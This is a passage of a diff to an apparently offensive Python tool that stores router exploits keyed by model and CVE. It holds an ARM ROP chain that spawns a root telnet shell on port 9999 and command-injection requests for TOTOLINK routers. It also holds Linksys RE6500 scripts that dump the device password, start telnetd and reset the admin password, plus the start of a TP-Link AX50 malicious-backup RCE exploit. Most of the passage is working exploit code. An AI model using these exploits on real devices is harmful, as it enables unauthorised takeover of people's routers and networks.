7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F\'\nexpayload = \'\'\npayload = payload.replace(\'z3Bz\',\'\\xff\\xff\\x1b\\x40\') # Need to Existed Address\npayload = payload.replace(\' AAA \',\'\\xf0\\x30\\x02\\x00\') #change eip\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nbssBase = 0x9E150   #string bss BASE Address\nexpayload += \'a\' * 4550\nexpayload += p32(bssBase+3) # R4 Register\nexpayload += p32(0x3F340) # R5 Register //tel\nexpayload += \'IIII\' # R6 Register\nexpayload += \'HHHH\' # R7 Register\nexpayload += \'GGGG\' # R8 Register\nexpayload += \'FFFF\' # R9 Register\nexpayload += p32(bssBase) # R10 Register\nexpayload += \'BBBB\' # R11 Register\nexpayload += p32(0x13644) # strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+6) #R4\nexpayload += p32(0x423D7) #R5  //telnet\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+8) #R4\nexpayload += p32(0x40CA4 ) #R5  //telnetd\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+10) #R4\nexpayload += p32(0x4704A) #R5  //telnetd\\x20-l\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+11) #R4\nexpayload += p32(0x04C281) #R5  //telnetd\\x20-l/bin/\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+16) #R4\nexpayload += p32(0x40CEC) #R5  //telnetd\\x20-l/bin/\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+18) #R4\nexpayload += p32(0x9CB5) #R5  //telnetd\\x20-l/bin/sh\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+22) #R4\nexpayload += p32(0x41B17) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+24) #R4\nexpayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x2099\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+26) #R4\nexpayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+28) #R4\nexpayload += p32(0x4A01D) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+30) #R4\nexpayload += p32(0x461C1) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\\x20\\x00\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nprint "[*] Make Payload ..."\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase) #R4\nexpayload += p32(0x47398) #R5\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x1A83C) #system(string) telnetd -l\ns.connect((\'239.255.255.250\', 1900))\nprint "[*] Send Proof Of Concept payload"\ns.send(\'a\\x00\'+expayload)#expayload is rop gadget\ns.send(payload)\ndef checkExploit():\nsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntry:\n    ret = soc.connect((\'192.168.1.1\',9999))\n    return 1\nexcept:\n    return 0\ntime.sleep(5)\nif checkExploit():\n    print("[*] Exploit Success")\n    print("[*] You can access telnet 192.168.1.1 9999")\nelse:\n    print("[*] Need to Existed Address cross each other")\n    print("[*] You need to reboot or execute upnpd daemon to execute upnpd")\n    print("[*] To exploit reexecute upnpd, description")\n    print("[*] Access http://192.168.1.1/debug.htm and enable telnet")\n    print("[*] then, You can access telnet. execute upnpd(just typing upnpd)")\ns.close()\nprint(Done)\n        ']
 }
 
 model_exp_dic["H3C_magic_R100"] = {
     "stack_overflow":["stackoverflow auth",
 """
 POST /goform/aspForm HTTP/1.1
 Host: 192.168.0.1
@@ -578,33 +649,33 @@
 model_exp_dic["TOTOLINK_A950RG"] = {
     "CVE-2022-25082":
 ['TOTOLink A950RG V5.9c.4050_B20190424 and V4.1.2cu.5204_B20210112 were discovered to contain a command injection vulnerability in the "Main" function. This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING parameter.\n[\'https://github.com/EPhaha/IOT_vuln/blob/main/TOTOLink/A950RG/README.md\']', '\nGET /cgi-bin/downloadFlile.cgi?payload=`ls>../1.txt` HTTP/1.1 \nHost: 192.168.111.12 \nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 \nAccept-Encoding: gzip, deflate \nConnection: keep-alive \nUpgrade-Insecure-Requests: 1 \nCache-Control: max-age=0\n']
 }
 
 model_exp_dic["TOTOLINK_T10"] = {
     "CVE-2022-25081":
-['TOTOLink T10 V5.9c.5061_B20200511 was discovered to contain a command injection vulnerability in the "Main" function. This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING parameter.\n[\'https://github.com/EPhaha/IOT_vuln/blob/main/TOTOLink/T10/README.md\']', '\nimport requests\n\nwhile(1):\n    print \'$\',\n    a = \'aabb;\' + raw_input().replace(\' \',\'$IFS$1\') + \';\'\n    response = requests.get("http://192.168.55.1/cgi-bin/downloadFlile.cgi",params=a)\n    print response.text.replace("QUERY_STRING:aabb",\'\')\n']
+['TOTOLink T10 V5.9c.5061_B20200511 was discovered to contain a command injection vulnerability in the "Main" function. This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING parameter.\n[\'https://github.com/EPhaha/IOT_vuln/blob/main/TOTOLink/T10/README.md\']', '\nimport requests\n\nwhile(1):\n    print(\'$\',)\n    a = \'aabb;\' + raw_input().replace(\' \',\'$IFS$1\') + \';\'\n    response = requests.get("http://192.168.55.1/cgi-bin/downloadFlile.cgi",params=a)\n    print(response.text.replace("QUERY_STRING:aabb",\'\'))\n']
 }
 
 model_exp_dic["TOTOLINK_A860R"] = {
     "CVE-2022-37840":
 ["In TOTOLINK A860R V4.1.2cu.5182_B20201027, the main function in downloadfile.cgi has a buffer overflow vulnerability.\n['https://github.com/1759134370/iot/blob/main/TOTOLINK/A860R/3.md']", '\nGET /cgi-bin/downloadFlile.cgi?payload=`ls>../1.txt` HTTP/1.1 \nHost: 192.168.111.12 \nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 \nAccept-Encoding: gzip, deflate \nConnection: keep-alive \nUpgrade-Insecure-Requests: 1 \nCache-Control: max-age=0\n']
 }
 
 
 model_exp_dic["Linsys_RE6500"] = {
     "CVE-2020-35714":
 ["Belkin LINKSYS RE6500 devices before 1.0.11.001 allow remote authenticated users to execute arbitrary commands via goform/systemCommand?command= in conjunction with the goform/pingstart program.\n['https://bugcrowd.com/disclosures/72d7246b-f77f-4f7f-9bd1-fdc35663cc92/linksys-re6500-unauthenticated-rce-working-across-multiple-fw-versions', 'https://downloads.linksys.com/support/assets/releasenotes/ExternalReleaseNotes_RE6500_1.0.012.001.txt', 'https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html']", '\n#!/usr/bin/env python\n#Linksys RE6500 V1.05 - Authenticated command injection Ping page\n\nfrom requests import Session\nimport requests\nimport os\nip="192.168.1.226"\nurl_codeinjection="http://"+ip+"/goform/systemCommand?pingTestIP=www.google.com&ping_size=32&ping_times=5&command=busybox+telnetd&+"\n\nrequestedbody_login="password=0000074200016071000071120003627500015159"\n\ns = requests.Session()\n\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\ns.post("http://"+ip+"/goform/webLogin",data=requestedbody_login)\n\ns.headers.update({\'Referer\': "http://"+ip+"/admin/diagnostics.shtml"})\n\ns.get(url_codeinjection)\n\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/admin/startping.shtml"})\n\ns.post("http://"+ip+"/goform/pingstart", data="")\n'],
     "CVE-2020-35713":
-["Belkin LINKSYS RE6500 devices before 1.0.012.001 allow remote attackers to execute arbitrary commands or set a new password via shell metacharacters to the goform/setSysAdm page.\n['https://bugcrowd.com/disclosures/72d7246b-f77f-4f7f-9bd1-fdc35663cc92/linksys-re6500-unauthenticated-rce-working-across-multiple-fw-versions', 'https://downloads.linksys.com/support/assets/releasenotes/ExternalReleaseNotes_RE6500_1.0.012.001.txt', 'https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html']", '\n#!/usr/bin/env python\n#Linksys RE6500 V1.0.05.003 and newer - Unauthenticated RCE\n#Unsanitized user input in the web interface for Linksys WiFi extender RE6500 allows Unauthenticated remote command execution. \n#An attacker can access system OS configurations and commands that are not intended for use beyond the web UI. \n\n# Exploit Author: RE-Solver - https://twitter.com/solver_re\n# Vendor Homepage: www.linksys.com\n# Version: FW V1.05 up to FW v1.0.11.001\n\nfrom requests import Session\nimport requests\nimport os\nprint("Linksys RE6500, RE6500 - Unsanitized user input allows Unauthenticated remote command execution.")\nprint("Tested on FW V1.05 up to FW v1.0.11.001")\nprint("RE-Solver @solver_re")\nip="192.168.1.226"\n\ncommand="nvram_get Password >/tmp/lastpwd"\n#save device password;\npost_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\n\nr= s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Prev password saved in /tmp/lastpwd")\n\ncommand="busybox telnetd"\n#start telnetd;\npost_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\n\nr=s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Telnet Enabled")\n\n#set admin password\npost_data="admuser=admin&admpass=0000074200016071000071120003627500015159&confirmadmpass=admin&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\nr=s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Prevent corrupting nvram - set a new password= admin"\n']
+["Belkin LINKSYS RE6500 devices before 1.0.012.001 allow remote attackers to execute arbitrary commands or set a new password via shell metacharacters to the goform/setSysAdm page.\n['https://bugcrowd.com/disclosures/72d7246b-f77f-4f7f-9bd1-fdc35663cc92/linksys-re6500-unauthenticated-rce-working-across-multiple-fw-versions', 'https://downloads.linksys.com/support/assets/releasenotes/ExternalReleaseNotes_RE6500_1.0.012.001.txt', 'https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html']", '\n#!/usr/bin/env python\n#Linksys RE6500 V1.0.05.003 and newer - Unauthenticated RCE\n#Unsanitized user input in the web interface for Linksys WiFi extender RE6500 allows Unauthenticated remote command execution. \n#An attacker can access system OS configurations and commands that are not intended for use beyond the web UI. \n\n# Exploit Author: RE-Solver - https://twitter.com/solver_re\n# Vendor Homepage: www.linksys.com\n# Version: FW V1.05 up to FW v1.0.11.001\n\nfrom requests import Session\nimport requests\nimport os\nprint("Linksys RE6500, RE6500 - Unsanitized user input allows Unauthenticated remote command execution.")\nprint("Tested on FW V1.05 up to FW v1.0.11.001")\nprint("RE-Solver @solver_re")\nip="192.168.1.226"\n\ncommand="nvram_get Password >/tmp/lastpwd"\n#save device password;\npost_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\n\nr= s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Prev password saved in /tmp/lastpwd")\n\ncommand="busybox telnetd"\n#start telnetd;\npost_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\n\nr=s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Telnet Enabled")\n\n#set admin password\npost_data="admuser=admin&admpass=0000074200016071000071120003627500015159&confirmadmpass=admin&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\nr=s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Prevent corrupting nvram - set a new password= admin")\n']
 }
 
 model_exp_dic["TP_Archer_AX50"] = {
     "CVE-2022-30075":
-["In TP-Link Router AX50 firmware 210730 and older, import of a malicious backup file via web interface can lead to remote code execution due to improper validation.\n['http://packetstormsecurity.com/files/167522/TP-Link-AX50-Remote-Code-Execution.html', 'http://tp-link.com', 'https://github.com/aaronsvk', 'https://github.com/aaronsvk/CVE-2022-30075', 'https://www.exploit-db.com/exploits/50962']", '\n#!/usr/bin/python3\n# Exploit Title: TP-Link Routers - Authenticated Remote Code Execution\n# Exploit Author: Tomas Melicher\n# Technical Details: https://github.com/aaronsvk/CVE-2022-30075\n# Date: 2022-06-08\n# Vendor Homepage: https://www.tp-link.com/\n# Tested On: Tp-Link Archer AX50\n# Vulnerability Description:\n#   Remote Code Execution via importing malicious config file\n\nimport argparse # pip install argparse\nimport requests # pip install requests\nimport binascii, base64, os, re, json, sys, time, math, random, hashlib\nimport tarfile, zlib\nfrom Crypto.Cipher import AES, PKCS1_v1_5, PKCS1_OAEP # pip install pycryptodome\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Random import get_random_bytes\nfrom urllib.parse import urlencode\n\nclass WebClient(object):\n\n\tdef __init__(self, target, password):\n\t\tself.target = target\n\t\tself.password = password.encode(\'utf-8\')\n\t\tself.password_hash = hashlib.md5((\'admin%s\'%password).encode(\'utf-8\')).hexdigest().encode(\'utf-8\')\n\t\tself.aes_key = (str(time.time()) + str(random.random())).replace(\'.\',\'\')[0:AES.block_size].encode(\'utf-8\')\n\t\tself.aes_iv = (str(time.time()) + str(random.random())).replace(\'.\',\'\')[0:AES.block_size].encode(\'utf-8\')\n\n\t\tself.stok = \'\'\n\t\tself.session = requests.Session()\n\n\t\tdata = self.basic_request(\'/login?form=auth\', {\'operation\':\'read\'})\n\t\tif data[\'success\'] != True:\n\t\t\tprint(\'[!] unsupported router\')\n\t\t\treturn\n\t\tself.sign_rsa_n = int(data[\'data\'][\'key\'][0], 16)\n\t\tself.sign_rsa_e = int(data[\'data\'][\'key\'][1], 16)\n\t\tself.seq = data[\'data\'][\'seq\']\n\n\t\tdata = self.basic_request(\'/login?form=keys\', {\'operation\':\'read\'})\n\t\tself.password_rsa_n = int(data[\'data\'][\'password\'][0], 16)\n\t\tself.password_rsa_e = int(data[\'data\'][\'password\'][1], 16)\n\n\t\tself.stok = self.login()\n\n\n\tdef aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = pad(plaintext, aes_block_size)\n\t\treturn cipher.encrypt(plaintext_padded)\n\n\n\tdef aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = cipher.decrypt(ciphertext)\n\t\tplaintext = unpad(plaintext_padded, aes_block_size)\n\t\treturn plaintext\n\n\n\tdef rsa_encrypt(self, n, e, plaintext):\n\t\tpublic_key = RSA.construct((n, e)).publickey()\n\t\tencryptor = PKCS1_v1_5.new(public_key)\n\t\tblock_size = int(public_key.n.bit_length()/8) - 11\n\t\tencrypted_text = \'\'\n\t\tfor i in range(0, len(plaintext), block_size):\n\t\t\tencrypted_text += encryptor.encrypt(plaintext[i:i+block_size]).hex()\n\t\treturn encrypted_text\n\n\n\tdef download_request(self, url, post_data):\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data=post_data, stream=True)\n\t\tfilepath = os.getcwd()+\'/\'+re.findall(r\'(?<=filename=")[^"]+\', res.headers[\'Content-Disposition\'])[0]\n\t\tif os.path.exists(filepath):\n\t\t\tprint(\'[!] can\'t download, file "%s" already exists\' % filepath)\n\t\t\treturn\n\t\twith open(filepath, \'wb\') as f:\n\t\t\tfor chunk in res.iter_content(chunk_size=4096):\n\t\t\t\tf.write(chunk)\n\t\treturn filepath\n\n\n\tdef basic_request(self, url, post_data, files_data={}):\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data=post_data, files=files_data)\n\t\treturn json.loads(res.content)\n\n\n\tdef encrypted_request(self, url, post_data):\n\t\tserialized_data = urlencode(post_data)\n\t\tencrypted_data = self.aes_encrypt(self.aes_key, self.aes_iv, AES.block_size, serialized_data.encode(\'utf-8\'))\n\t\tencrypted_data = base64.b64encode(encrypted_data)\n\n\t\tsignature = (\'k=%s&i=%s&h=%s&s=%d\'.encode(\'utf-8\')) % (self.aes_key, self.aes_iv, self.password_hash, self.seq+len(encrypted_data))\n\t\tencrypted_signature = self.rsa_encrypt(self.sign_rsa_n, self.sign_rsa_e, signature)\n\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data={\'sign\':encrypted_signature, \'data\':encrypted_data}) # order of params is important\n\t\tif(res.status_code != 200):\n\t\t\tprint(\'[!] url "%s" returned unexpected status code\'%(url))\n\t\t\treturn\n\t\tencrypted_data = json.loads(res.content)\n\t\tencrypted_data = base64.b64decode(encrypted_data[\'data\'])\n\t\tdata = self.aes_decrypt(self.aes_key, self.aes_iv, AES.block_size, encrypted_data)\n\t\treturn json.loads(data)\n\n\n\tdef login(self):\n\t\tpost_data = {\'operation\':\'login\', \'password\':self.rsa_encrypt(self.password_rsa_n, self.password_rsa_e, self.password)}\n\t\tdata = self.encrypted_request(\'/login?form=login\', post_data)\n\t\tif data[\'success\'] != True:\n\t\t\tprint(\'[!] login failed\')\n\t\t\treturn\n\t\tprint(\'[+] logged in, received token (stok): %s\'%(data[\'data\'][\'stok\']))\n\t\treturn data[\'data\'][\'stok\']\n\n\n\nclass BackupParser(object):\n\n\tdef __init__(self, filepath):\n\t\tself.encrypted_path = os.path.abspath(filepath)\n\t\tself.decrypted_path = os.path.splitext(filepath)[0]\n\n\t\tself.aes_key = bytes.fromhex(\'2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836\') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua\n\t\tself.iv = bytes.fromhex(\'360028C9064242F81074F4C127D299F6\') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua\n\n\n\tdef aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = pad(plaintext, aes_block_size)\n\t\treturn cipher.encrypt(plaintext_padded)\n\n\n\tdef aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = cipher.decrypt(ciphertext)\n\t\tplaintext = unpad(plaintext_padded, aes_block_size)\n\t\treturn plaintext\n\n\n\tdef encrypt_config(self):\n\t\tif not os.path.isdir(self.decrypted_path):\n\t\t\tprint(\'[!] invalid directory "%s"\'%(self.decrypted_path))\n\t\t\treturn\n\n\t\t# encrypt, compress each .xml using zlib and add them to tar archive\n\t\twith tarfile.open(\'%s/data.tar\'%(self.decrypted_path), \'w\') as tar:\n\t\t\tfor filename in os.listdir(self.decrypted_path):\n\t\t\t\tbasename,ext = os.path.splitext(filename)\n\t\t\t\tif ext == \'.xml\':\n\t\t\t\t\txml_path = \'%s/%s\'%(self.decrypted_path,filename)\n\t\t\t\t\tbin_path = \'%s/%s.bin\'%(self.decrypted_path,basename)\n\t\t\t\t\twith open(xml_path, \'rb\') as f:\n\t\t\t\t\t\tplaintext = f.read()\n\t\t\t\t\tif len(plaintext) == 0:\n\t\t\t\t\t\tf = open(bin_path, \'w\')\n\t\t\t\t\t\tf.close()\n\t\t\t\t\telse:\n\t\t\t\t\t\tcompressed = zlib.compress(plaintext)\n\t\t\t\t\t\tencrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)\n\t\t\t\t\t\twith open(bin_path, \'wb\') as f:\n\t\t\t\t\t\t\tf.write(encrypted)\n\t\t\t\t\ttar.add(bin_path, os.path.basename(bin_path))\n\t\t\t\t\tos.unlink(bin_path)\n\t\t# compress tar archive using zlib and encrypt\n\t\twith open(\'%s/md5_sum\'%(self.decrypted_path), \'rb\') as f1, open(\'%s/data.tar\'%(self.decrypted_path), \'rb\') as f2:\n\t\t\tcompressed = zlib.compress(f1.read()+f2.read())\n\t\tencrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)\n\t\t# write into final config file\n\t\twith open(\'%s\'%(self.encrypted_path), \'wb\') as f:\n\t\t\tf.write(encrypted)\n\t\tos.unlink(\'%s/data.tar\'%(self.decrypted_path))\n\n\n\tdef decrypt_config(self):\n\t\tif not os.path.isfile(self.encrypted_path):\n\t\t\tprint(\'[!] invalid file "%s"\'%(self.encrypted_path))\n\t\t\treturn\n\n\t\t# decrypt and decompress config file\n\t\twith open(self.encrypted_path, \'rb\') as f:\n\t\t\tdecrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, f.read())\n\t\tdecompressed = zlib.decompress(decrypted)\n\t\tos.mkdir(self.decrypted_path)\n\t\t# store decrypted data into files\n\t\twith open(\'%s/md5_sum\'%(self.decrypted_path), \'wb\') as f:\n\t\t\tf.write(decompressed[0:16])\n\t\twith open(\'%s/data.tar\'%(self.decrypted_path), \'wb\') as f:\n\t\t\tf.write(decompressed[16:])\n\t\t# untar second part of decrypted data\n\t\twith tarfile.open(\'%s/data.tar\'%(self.decrypted_path), \'r\') as tar:\n\t\t\ttar.extractall(path=self.decrypted_path)\n\t\t# decrypt and decompress each .bin file from tar archive\n\t\tfor filename in os.listdir(self.decrypted_path):\n\t\t\tbasename,ext = os.path.splitext(filename)\n\t\t\tif ext == \'.bin\':\n\t\t\t\tbin_path = \'%s/%s\'%(self.decrypted_path,filename)\n\t\t\t\txml_path = \'%s/%s.xml\'%(self.decrypted_path,basename)\n\t\t\t\twith open(bin_path, \'rb\') as f:\n\t\t\t\t\tciphertext = f.read()\n\t\t\t\tos.unlink(bin_path)\n\t\t\t\tif len(ciphertext) == 0:\n\t\t\t\t\tf = open(xml_path, \'w\')\n\t\t\t\t\tf.close()\n\t\t\t\t\tcontinue\n\t\t\t\tdecrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, ciphertext)\n\t\t\t\tdecompressed = zlib.decompress(decrypted)\n\t\t\t\twith open(xml_path, \'wb\') as f:\n\t\t\t\t\tf.write(decompressed)\n\t\tos.unlink(\'%s/data.tar\'%(self.decrypted_path))\n\n\n\tdef modify_config(self, command):\n\t\txml_path = \'%s/ori-backup-user-config.xml\'%(self.decrypted_path)\n\t\tif not os.path.isfile(xml_path):\n\t\t\tprint(\'[!] invalid file "%s"\'%(xml_path))\n\t\t\treturn\n\n\t\twith open(xml_path, \'r\') as f:\n\t\t\txml_content = f.read()\n\n\t\t# https://openwrt.org/docs/guide-user/services/ddns/client#detecting_wan_ip_with_script\n\t\tpayload = \'<service name="exploit">\n\'\n\t\tpayload += \'<enabled>on</enabled>\n\'\n\t\tpayload += \'<update_url>http://127.0.0.1/</update_url>\n\'\n\t\tpayload += \'<domain>x.example.org</domain>\n\'\n\t\tpayload += \'<username>X</username>\n\'\n\t\tpayload += 